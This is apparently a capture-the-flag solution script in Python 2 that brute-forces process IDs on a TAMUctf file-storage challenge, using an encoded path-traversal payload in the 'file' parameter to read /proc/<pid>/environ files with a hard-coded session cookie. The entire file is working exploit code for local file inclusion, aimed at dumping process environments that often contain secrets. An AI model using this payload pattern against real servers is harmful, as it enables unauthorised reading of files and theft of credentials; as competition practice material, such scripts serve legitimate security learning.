from pwn import *
import requests
import time
import re




pids =  []
for i in range(1,99999):
	print 'trying with : ' + str(i)
	cookies = {'PHPSESSID': '5d26a0ml1pmcn6hj92en4s3p80'}
	url = "http://filestorage.tamuctf.com/index.php?file=..%2F..%2F..%2F..%2F..%2F%2Fproc%2F{0}%2Fenviron".format(i)
	res = requests.get(url, cookies= cookies)
	print res.text
	#pt = re.compile('\([a-z]*\)') #check stat
	#ret = pt.findall(res.text)
	'''	
	if len(ret) > 0 :
		print 'found pid!'
		print 'found pid!'
		pids.append({i, ret[0]})
		print ret[0]
	'''
	
		
print 'pids is here!'
print 'pids is here!'
print 'pids is here!'
print pids
